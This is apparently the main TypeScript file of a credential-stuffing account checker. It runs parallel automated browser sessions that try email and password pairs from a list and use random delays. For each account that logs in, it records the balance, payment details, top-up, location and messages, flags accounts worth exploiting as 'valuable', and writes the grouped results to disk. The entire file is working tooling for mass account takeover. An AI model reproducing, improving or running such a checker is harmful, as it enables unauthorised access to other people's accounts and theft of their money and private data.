import { rmSync } from 'fs';
import { loadConfig } from './src/config.js';
import { loadAccounts } from './src/accounts.js';
import { createSession, clearSession } from './src/browser.js';
import { checkAccount, isValuable, randDelay } from './src/checker.js';
import * as ui from './src/ui.js';
import * as output from './src/output.js';
import type { ResultEntry } from './src/types.js';
import type { Account } from './src/accounts.js';

let nextIdx = 0;

async function worker(
  id: number,
  cfg: ReturnType<typeof loadConfig>,
  accounts: Account[],
): Promise<ResultEntry[]> {
  const session = await createSession(cfg, id);
  const { browser, page, profileDir } = session;
  const localResults: ResultEntry[] = [];

  try {
    while (true) {
      const jobIdx = nextIdx++;
      if (jobIdx >= accounts.length) break;

      const account = accounts[jobIdx]!;
      const lineNum = cfg.startLine + jobIdx;
      const email = account.email;
      const pass = account.password;

      await clearSession(page);

      try {
        const info = await checkAccount(page, cfg, email, pass);
        const valuable = isValuable(info);

        const entry: ResultEntry = {
          line: lineNum,
          email,
          password: pass,
          status: 'OK',
          balance: info.balance,
          topUp: info.topUp,
          payment: info.payment,
          loc: info.loc,
          threads: info.threads,
          messages: info.messages,
          valuable,
        };

        localResults.push(entry);
        ui.result(entry, {
          showPerAccount: cfg.ui.showPerAccount,
          compact: cfg.ui.compact,
        });
      } catch (err: unknown) {
        let status: ResultEntry['status'] = 'ERR';
        const msg = err instanceof Error ? err.message : String(err);
        if (msg === 'wrong-pass') status = 'WRONG';
        else if (msg === 'blocked') status = 'BLOCKED';
        else if (msg.includes('no-') || msg === 'no-password-step') status = 'BROKEN';

        const entry: ResultEntry = {
          line: lineNum,
          email,
          password: pass,
          status,
          error: msg,
          valuable: false,
        };

        localResults.push(entry);
        ui.result(entry, {
          showPerAccount: cfg.ui.showPerAccount,
          compact: cfg.ui.compact,
        });
      }

      await new Promise<void>((r) => setTimeout(r, randDelay(cfg)));
    }
  } finally {
    await browser.close().catch(() => {});
    if (!cfg.chromeProfile) {
      rmSync(profileDir, { recursive: true, force: true });
    }
  }

  return localResults;
}

async function main(): Promise<void> {
  const cfg = loadConfig();

  if (cfg.cui || process.argv.includes('--setup')) {
    await require('./src/cui.js').setup();
    delete require.cache[require.resolve('./src/config.js')];
    Object.assign(cfg, require('./src/config.js').loadConfig());
  }

  const accounts = loadAccounts(cfg);
  const wc = Math.min(cfg.threads, accounts.length);

  ui.banner();
  ui.start({ ...cfg, total: accounts.length, threads: wc });

  const startTime = Date.now();

  const workers: Promise<ResultEntry[]>[] = [];
  for (let i = 0; i < wc; i++) {
    workers.push(worker(i, cfg, accounts));
  }

  const results = (await Promise.all(workers)).flat();
  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);

  const stats = {
    total: accounts.length,
    completed: results.length,
    ok: results.filter((r) => r.status === 'OK').length,
    wrong: results.filter((r) => r.status === 'WRONG').length,
    blocked: results.filter((r) => r.status === 'BLOCKED').length,
    broken: results.filter((r) => r.status === 'BROKEN').length,
    err: results.filter(
      (r) => !['OK', 'WRONG', 'BLOCKED', 'BROKEN'].includes(r.status),
    ).length,
    valuable: results.filter((r) => r.valuable).length,
  };

  Object.assign(ui.getStats(), stats);
  ui.summary();

  output.writeGrouped(cfg.outputDir, results);
  output.writeSummary(cfg.outputDir, accounts.length, stats, elapsed);

  console.log(`  Results saved to ${cfg.outputDir}/`);
  console.log('');
}

main().catch((err: unknown) => {
  console.error('Fatal:', err);
  process.exit(1);
});
